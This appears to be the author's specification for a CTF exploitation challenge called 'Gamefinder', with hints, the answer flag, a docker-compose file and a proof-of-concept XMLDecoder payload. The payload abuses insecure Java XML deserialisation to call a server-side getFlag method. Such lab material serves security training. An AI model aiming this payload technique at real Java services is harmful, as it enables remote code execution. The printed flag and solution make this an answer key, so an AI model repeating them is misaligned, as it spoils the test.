
| metadata | </> |
|--- | --- |
| Developer Name(s) | Jorel |
| Best Contact Slack handle / Email address | [redacted] |
| Challenge Category | Exploitation |
| Challenge Tier | 3 |
| Challenge Type | Container |

| Player facing | <> |
|--- | --- |
|Challenge Name | Gamefinder |
|Challenge Description | A new application has been developed to help user's get cheap prices on video games, development was done pretty quickly, and security wasn't a priority. http://exploit-3 | 
|Challenge Hint 1 | A decompiler would be helpful to find winning function |
|Challenge Hint 2 | Check the file the program saves. The critical vulnerability is in the OWASP top 10. |

| Admin Facing | <> |
|--- | --- |
|Challenge Flag| WACTF{UR_L1br@ry_Waz_2_P0w3rful} |
|Challenge Vuln| Insecure Java XML Deserialisation | 
|Docker Usage Idle| 0.3% CPU / 5.5MB RAM |
|Docker Usage Expected Peak| 3% CPU / 8MB RAM |
---

# docker-compose.yml

```yml
version: '3'
services:

  exp-3:
    container_name: exp-3
    build: ./exp-3/
    image: registry.capture.tf:5000/wactf0x04/exp-3
    ports:
      - 8484:80
    deploy:
      resources:
        limits:
          cpus: '0.10'
          memory: 180M
        reservations:
          cpus: '0.05'
          memory: 10M
    cap_drop:
      - NET_RAW
```

# Challenge PoC.py

1. Players will connect to the server side web application. 
2. Player will download the offline desktop java application
3. Player will run the java application and notice the file saving is deserialisation
4. players will decompile the offline java app to find the vulnerable getFlag function
5. Players will write the following XML payload, based on the saved file, to call the getFlag function from the server-side. 
6. Players will upload the file and win.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_265" class="java.beans.XMLDecoder">
 <object class="model.Library" id="Library0">
  <void property="games">
   <void method="add">
    <object class="controller.LibraryAnalyser">
     <void method="getFlag">
     </void>
    </object>
   </void>
  </void>
  <void property="name">
   <string>test</string>
  </void>
 </object>
</java>
```

